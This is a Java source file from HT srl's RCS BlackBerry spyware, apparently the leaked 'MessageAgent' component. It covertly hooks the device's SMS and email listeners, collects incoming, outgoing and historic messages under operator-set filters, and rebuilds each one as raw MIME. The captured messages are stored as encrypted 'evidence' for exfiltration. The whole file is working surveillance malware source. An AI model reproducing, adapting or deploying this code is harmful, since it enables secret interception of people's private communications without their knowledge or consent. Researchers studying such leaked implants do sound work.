//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : MessageAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.io.UnsupportedEncodingException;
import java.util.Date;
import java.util.Enumeration;
import java.util.Vector;

import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.TextMessage;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.Header;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.IntHashtable;
import blackberry.AgentManager;
import blackberry.Status;
import blackberry.agent.mail.Filter;
import blackberry.agent.mail.Mail;
import blackberry.agent.mail.MailListener;
import blackberry.agent.mail.MailParser;
import blackberry.agent.sms.SmsListener;
import blackberry.config.Conf;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.evidence.TimestampMarkup;
import blackberry.interfaces.MailObserver;
import blackberry.interfaces.SmsObserver;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/*
 * http://rcs-dev/trac/browser/RCSASP/deps/Common/ASP_Common.h
 * 
 * 118  #define LOGTYPE_MAIL_RAW                        0x1001
 119 #define LOGTYPE_MAIL                            0x0210


 * 198  typedef struct _MailAdditionalData {
 199         UINT uVersion;
 200                 #define LOG_MAIL_VERSION 2009070301
 201         UINT uFlags;
 202         UINT uSize;
 203         FILETIME ftTime;
 204 } MailAdditionalData, *pMailAdditionalData;

 http://rcs-dev/trac/browser/RCSASP/deps/XML-RPC/XMLInserting.cpp

 uFlags = 1 : body retrieved
 0: non ha superato i controlli di size, il body viene tagliato

 */

/**
 * The Class MessageAgent.
 */
public final class MessageAgent extends Agent implements SmsObserver,
        MailObserver {

    //#ifdef DEBUG
    static Debug debug = new Debug("MessageAgent", DebugLevel.VERBOSE);
    //#endif

    private static final int SMS_VERSION = 2010050501;
    private static final int MAIL_VERSION = 2009070301;

    protected static final int SLEEPTIME = 5000;
    protected static final int PERIODTIME = 60 * 60 * 1000;

    boolean mailEnabled;
    boolean smsEnabled;

    MailListener mailListener;
    SmsListener smsListener;

    TimestampMarkup markupDate;
    //public Date lastcheck = new Date(0);

    protected String identification;
    public IntHashtable filtersSMS = new IntHashtable();
    public IntHashtable filtersMMS = new IntHashtable();
    public IntHashtable filtersEMAIL = new IntHashtable();

    boolean firstRun;
    Thread historyThread = null;

    /**
     * Instantiates a new message agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public MessageAgent(final boolean agentEnabled) {
        super(AGENT_MESSAGE, agentEnabled, Conf.AGENT_MESSAGE_ON_SD,
                "MessageAgent");

        //#ifdef DBC
        Check.asserts(
                Evidence.convertTypeEvidence(agentId) == EvidenceType.MAIL_RAW,
                "Wrong Conversion");
        //#endif

        mailListener = MailListener.getInstance();
        smsListener = SmsListener.getInstance();
        //smsListener.setMessageAgent(this);
    }

    /**
     * Instantiates a new message agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected MessageAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);

        // mantiene la data prima di controllare tutte le email
        markupDate = new TimestampMarkup(agentId, Encryption.getKeys()
                .getAesKey());

        parse(confParams);

        setDelay(SLEEPTIME);
        setPeriod(PERIODTIME);
    }



    public static MessageAgent getInstance() {
        return (MessageAgent) Status.getInstance()
                .getAgent(Agent.AGENT_MESSAGE);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {

        // Ogni ora viene verificato se i nomi degli account corrisponde
        // se non corrisponde, restart dell'agente.

        if (firstRun) {
            //#ifdef DEBUG
            debug.info("First Run");
            //#endif
            firstRun = false;

            if (mailEnabled) {
                if (historyThread != null) {
                    //#ifdef DEBUG
                    debug.trace("actualRun: stopping historyThread");
                    //#endif

                    //#ifdef HISTORY_MAIL
                    mailListener.stopHistory();
                    //#endif

                    try {
                        historyThread.join();
                        //#ifdef DEBUG
                        debug.trace("actualRun: joined");
                        //#endif
                    } catch (Exception e) {
                        //#ifdef DEBUG
                        debug.error("actualRun: " + e);
                        //#endif
                    }
                }
                historyThread = new Thread(new Runnable() {
                    public void run() {
                        mailListener.retrieveHistoricMails();
                    }
                });
                historyThread.start();
            }
        }

        if (mailEnabled && haveNewAccount()) {
            //#ifdef DEBUG
            debug.info("Restarting MessageAgent, new account");
            //#endif
            AgentManager.getInstance().reStart(agentId);
        }

    }

    private boolean haveNewAccount() {

        return mailListener.haveNewAccount();
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public void actualStart() {
        firstRun = true;
        //TODO: se gli sms sono disabilitati non far partire il listener.
        if (smsEnabled) {
            smsListener.addSmsObserver(this);
        }

        //TODO: se l'email e' disabilitata non far partire il listener.
        if (mailEnabled) {
            mailListener.addSingleMailObserver(this);
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public void actualStop() {
        if (smsEnabled) {
            smsListener.removeSmsObserver(this);
        }

        if (mailEnabled) {
            mailListener.removeSingleMailObserver(this);
            ;
        }
    }

    /**
     * Creates the log.
     * 
     * @param additionalData
     *            the additional data
     * @param content
     *            the content
     * @param logType
     */
    public void createEvidence(final byte[] additionalData,
            final byte[] content, final int logType) {

        //#ifdef DBC
        Check.requires(content != null, "createEvidence content null");
        Check.requires(evidence != null, "log null");
        //#endif

        evidence.atomicWriteOnce(additionalData, logType, content);

        //#ifdef DEBUG
        debug.trace("Evidence created");
        //#endif
    }

    /*    *//**
     * Inits the markup.
     * 
     * @return the long
     */

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] conf) {

        final Vector tokens = tokenize(conf);
        if (tokens == null) {
            //#ifdef DEBUG
            debug.error("Cannot tokenize conf");
            //#endif
            return false;
        }

        final int size = tokens.size();
        for (int i = 0; i < size; ++i) {
            final Prefix token = (Prefix) tokens.elementAt(i);

            switch (token.type) {
                case Prefix.TYPE_IDENTIFICATION:
                    // IDENTIFICATION TAG
                    identification = WChar.getString(conf, token.payloadStart,
                            token.length, false);
                    //#ifdef DEBUG
                    debug.trace("Type 1: " + identification);
                    //#endif
                    break;
                case Prefix.TYPE_FILTER:
                    // Filtro (sempre 2, uno COLLECT e uno REALTIME);
                    try {
                        final Filter filter = new Filter(conf,
                                token.payloadStart, token.length);
                        if (filter.isValid()) {
                            switch (filter.classtype) {
                                case Filter.CLASS_EMAIL:
                                    //#ifdef DEBUG
                                    debug.info(filter.toString());
                                    //#endif

                                    mailEnabled = true;
                                    if (filter.type == Filter.TYPE_COLLECT) {
                                        //#ifdef DEBUG
                                        debug.trace("Filter.TYPE_COLLECT!");
                                        //#endif

                                        final Date oldfrom = lastcheckGet("FilterFROM");
                                        final Date oldto = lastcheckGet("FilterTO");

                                        if (filter.fromDate.getTime() == oldfrom
                                                .getTime()
                                                && filter.toDate.getTime() == oldto
                                                        .getTime()) {
                                            //#ifdef DEBUG
                                            debug.info("same Mail Collect Filter");
                                            //#endif
                                        } else {
                                            //#ifdef DEBUG
                                            debug.warn("Changed collect filter, resetting markup");
                                            debug.trace("oldfrom: " + oldfrom);
                                            debug.trace("oldto: " + oldto);
                                            //#endif
                                            lastcheckReset();
                                            lastcheckSet("FilterFROM",
                                                    filter.fromDate);
                                            lastcheckSet("FilterTO",
                                                    filter.toDate);
                                        }
                                    }

                                    //#ifdef DEBUG
                                    debug.trace("put: " + filter.type);
                                    //#endif
                                    filtersEMAIL.put(filter.type, filter);

                                    break;
                                case Filter.CLASS_MMS:
                                    //#ifdef DEBUG
                                    debug.info(filter.toString());
                                    //#endif
                                    filtersMMS.put(filter.type, filter);
                                    break;
                                case Filter.CLASS_SMS:
                                    //#ifdef DEBUG                            
                                    debug.info(filter.toString());
                                    //#endif
                                    smsEnabled = true;
                                    filtersSMS.put(filter.type, filter);
                                    break;
                                case Filter.CLASS_UNKNOWN: // fall through
                                default:
                                    //#ifdef DEBUG
                                    debug.error("unknown classtype: "
                                            + filter.classtype);
                                    //#endif
                                    break;
                            }
                        }
                        //#ifdef DEBUG
                        debug.trace("Type 2: header valid: " + filter.isValid());
                        //#endif
                    } catch (final Exception e) {
                        //#ifdef DEBUG
                        debug.error("Cannot filter " + e);
                        //#endif
                    }
                    break;

                default:
                    //#ifdef DEBUG
                    debug.error("Unknown type: " + token.type);
                    //#endif
                    break;
            }
        }

        return true;
    }

    private Vector tokenize(final byte[] conf) {
        final Vector tokens = new Vector();
        int offset = 0;
        final int length = conf.length;

        while (offset < length) {
            final Prefix token = new Prefix(conf, offset);
            if (!token.isValid()) {

                return null;
            } else {
                tokens.addElement(token);
                offset += token.length + 4;
            }
        }

        return tokens;
    }

    public synchronized void lastcheckSet(String key, Date date) {
        //#ifdef DEBUG
        debug.trace("Writing markup: " + key + " date: " + date);
        //#endif

        final MessageAgent agent = MessageAgent.getInstance();

        if (agent != null) {
            agent.markupDate.put(key, date);
        } else {
            markupDate.put(key, date);
        }

    }

    public synchronized Date lastcheckGet(String key) {

        //#ifdef DBC
        Check.requires(markupDate != null, "lastcheckGet markupDate==null");
        //#endif

        Date date = markupDate.get(key);

        //#ifdef DEBUG
        debug.trace("getLastCheck: " + key + " = " + date);
        //#endif

        if (date == null) {
            date = new Date(0);
            markupDate.put(key, date);
        }
        return date;
    }

    public synchronized void lastcheckReset() {
        //#ifdef DEBUG
        debug.trace("lastcheckReset markupDate: " + markupDate);
        //#endif

        markupDate.removeMarkup();

        //lastcheck = new Date(0); 
    }

    public void onNewSms(final javax.wireless.messaging.Message message,
            final boolean incoming) {
        //#ifdef DBC
        Check.requires(message != null, "saveLog: null message");
        //#endif

        //#ifdef DEBUG
        debug.trace("saveLog: " + message);
        //#endif

        final byte[] dataMsg = getSmsDataMessage(message);
        //#ifdef DBC
        Check.asserts(dataMsg != null, "saveLog: null dataMsg");
        //#endif

        //final ByteArrayOutputStream os = null;
        try {

            final int flags = incoming ? 1 : 0;

            DateTime filetime = null;
            final int additionalDataLen = 48;
            final byte[] additionalData = new byte[additionalDataLen];

            String from;
            String to;
            String address = message.getAddress();

            // Check if it's actually a sms

            final String prefix = "sms://";
            if (address.indexOf(prefix) == 0) {
                address = address.substring(prefix.length());
            } else {
                //#ifdef DEBUG
                debug.error("Not a sms");
                //#endif
                return;
            }

            if (address.indexOf(":") > 0) {
                //#ifdef DEBUG
                debug.warn("Probably a MMS");
                //#endif
                return;
            }

            // Filling fields

            final Date date = new Date();

            if (incoming) {
                from = address;
                to = getMySmsAddress();

            } else {
                from = getMySmsAddress();
                to = address;
            }

            filetime = new DateTime(date);

            //#ifdef DBC
            Check.asserts(filetime != null, "saveLog: null filetime");
            //#endif

            // preparing additionalData

            final DataBuffer databuffer = new DataBuffer(additionalData, 0,
                    additionalDataLen, false);
            databuffer.writeInt(SMS_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeLong(filetime.getFiledate());
            databuffer.write(Utils.padByteArray(from.getBytes(), 16));
            databuffer.write(Utils.padByteArray(to.getBytes(), 16));

            //#ifdef DEBUG
            debug.info("sms : " + (incoming ? "incoming" : "outgoing"));
            debug.info("From: " + from + " To: " + to + " date: "
                    + filetime.toString());
            //#endif

            //#ifdef DBC
            Check.ensures(databuffer.getLength() == additionalDataLen,
                    "SMS Wrong databuffer size: " + databuffer.getLength());
            Check.ensures(additionalData.length == additionalDataLen,
                    "SMS Wrong buffer size: " + additionalData.length);
            //#endif

            // Creating log
            if (dataMsg != null) {
                createEvidence(additionalData, dataMsg, EvidenceType.SMS_NEW);
                return;
            } else {
                //#ifdef DEBUG
                debug.error("data null");
                //#endif
                return;
            }

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("saveLog message: " + ex);
            //#endif
            return;
        }
    }

    /**
     * @param message
     * @param dataMsg
     * @return
     */
    private byte[] getSmsDataMessage(
            final javax.wireless.messaging.Message message) {

        byte[] dataMsg = null;

        if (message instanceof TextMessage) {
            final TextMessage tm = (TextMessage) message;
            final String msg = tm.getPayloadText();
            //#ifdef DEBUG
            debug.info("Got Text SMS: " + msg);
            //#endif

            dataMsg = WChar.getBytes(msg);

        } else if (message instanceof BinaryMessage) {
            dataMsg = ((BinaryMessage) message).getPayloadData();

            try {

                //String msg16 = new String(data, "UTF-16BE");
                final String msg8 = new String(dataMsg, "UTF-8");

                //#ifdef DEBUG
                //debug.trace("saveLog msg16:" + msg16);
                debug.trace("saveLog msg8:" + msg8);
                //#endif

            } catch (final UnsupportedEncodingException e) {
                //#ifdef DEBUG
                debug.error("saveLog:" + e);
                //#endif
            }
            //#ifdef DEBUG
            debug.info("Got Binary SMS, len: " + dataMsg.length);
            //#endif
        }
        return dataMsg;
    }

    private String getMySmsAddress() {
        final String number = Phone.getDevicePhoneNumber(false);
        if (number == null || number.startsWith("Unknown")) {
            return "local";
        }

        //#ifdef DBC
        Check.ensures(number.length() <= 16, "getMyAddress too long: " + number);
        //#endif

        return number;
    }

    public void onNewMail(final Message message, final int maxMessageSize,
            final String storeName) {

        //#ifdef DBC
        Check.requires(message != null, "message != null");
        Check.requires(storeName != null, "storeName != null");
        //#endif

        //#ifdef DEBUG
        debug.trace("saveEvidence: " + message + " name: " + storeName);
        //#endif

        try {

            final int flags = 1;

            String from = "local";
            if (storeName.indexOf("@") > 0) {
                from = storeName;
            }
            final String mail = makeMimeMessage(message, maxMessageSize, from);
            //#ifdef DBC
            Check.asserts(mail != null, "Null mail");
            //#endif

            int size = message.getSize();
            if (size == -1) {
                size = mail.length();
            }

            final DateTime filetime = new DateTime(message.getReceivedDate());

            final byte[] additionalData = new byte[20];

            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
                    false);
            databuffer.writeInt(MAIL_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeInt(size);
            databuffer.writeLong(filetime.getFiledate());
            //#ifdef DBC
            Check.asserts(additionalData.length == 20,
                    "Mail Wrong buffer size: " + additionalData.length);
            //#endif

            //#ifdef DEBUG
            debug.trace("saveEvidence: "
                    + mail.substring(0, Math.min(mail.length(), 200)));
            //#endif

            createEvidence(additionalData, mail.getBytes("UTF-8"),
                    EvidenceType.MAIL_RAW);

            //messageAgent.createLog(additionalData, mail.getBytes("ISO-8859-1"),
            //      LogType.MAIL_RAW);

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("saveEvidence message: " + ex);
            //#endif

        }

    }

    private String makeMimeMessage(final Message message,
            final int maxMessageSize, final String from) {
        final Address[] addresses;

        final StringBuffer mailRaw = new StringBuffer();

        // costruisce gli header
        addAllHeaders(message.getAllHeaders(), mailRaw);
        addFromHeaders(message.getAllHeaders(), mailRaw, from);

        // decode del mime, separo text da html
        final MailParser parser = new MailParser(message);
        final Mail mail = parser.parse();

        //#ifdef DEBUG
        debug.trace("Email size: " + message.getSize() + " bytes");
        debug.trace("Sent date: " + message.getSentDate());
        debug.trace("Subject: " + message.getSubject());
        //debug.trace("Body text: " + message.getBodyText());
        //#endif

        // comincia la ricostruzione del MIME
        mailRaw.append("MIME-Version: 1.0\r\n");
        final long rnd = Math.abs(Utils.randomLong());
        final String boundary = "------_=_NextPart_" + rnd;

        if (mail.isMultipart()) {
            mailRaw.append("Content-Type: multipart/alternative; boundary="
                    + boundary + "\r\n");
            mailRaw.append("\r\n--" + boundary + "\r\n");
        }

        if (mail.hasText()) {
            mailRaw.append(mail.plainTextMessageContentType);
            String msg = mail.plainTextMessage;
            if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
                msg = msg.substring(0, maxMessageSize);
            }
            mailRaw.append(msg);
        }

        if (mail.isMultipart()) {
            mailRaw.append("\r\n--" + boundary + "\r\n");
        }

        if (mail.hasHtml()) {
            //mailRaw.append("Content-Transfer-Encoding: quoted-printable\r\n");
            //mailRaw.append("Content-type: text/html; charset=UTF8\r\n\r\n");
            mailRaw.append(mail.htmlMessageContentType);
            mailRaw.append(mail.htmlMessage);
        }

        if (mail.isMultipart()) {
            mailRaw.append("\r\n--" + boundary + "--\r\n");
        }

        // se il mio parser fallisce, uso la decodifica di base fornita dalla classe Message
        if (mail.isEmpty()) {
            mailRaw.append("Content-type: text/plain; charset=UTF8\r\n\r\n");

            String msg = message.getBodyText();
            if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
                msg = msg.substring(0, maxMessageSize);
            }
            mailRaw.append(msg);
        }

        mailRaw.append("\r\n");

        final String craftedMail = mailRaw.toString();

        return craftedMail;
    }

    /**
     * Aggiunge alla mail "raw" generata la lista di header presenti nel Message
     * originale
     * 
     * @param headers
     * @param mail
     */
    private void addAllHeaders(final Enumeration headers,
            final StringBuffer mail) {

        while (headers.hasMoreElements()) {
            final Object headerObj = headers.nextElement();
            if (headerObj instanceof Header) {
                final Header header = (Header) headerObj;
                mail.append(header.getName());
                mail.append(header.getValue());
                mail.append("\r\n");
            } else {
                //#ifdef DEBUG
                debug.error("Unknown header type: " + headerObj);
                //#endif
            }
        }
    }

    /**
     * Il metodo addAllHeaders non estrae il campo from. Occorre specificarglelo
     * esplicitamente.
     * 
     * @param headers
     * @param mail
     * @param from
     */
    private void addFromHeaders(final Enumeration headers,
            final StringBuffer mail, final String from) {

        boolean fromFound = false;
        while (headers.hasMoreElements()) {
            final Object headerObj = headers.nextElement();
            if (headerObj instanceof Header) {
                final Header header = (Header) headerObj;
                if (header.getName().startsWith("From")) {
                    fromFound = true;
                }
            }
        }
        if (!fromFound) {
            //#ifdef DEBUG
            debug.info("Adding from: " + from);
            //#endif
            mail.append("From: " + from + "\r\n");
        }
    }

}
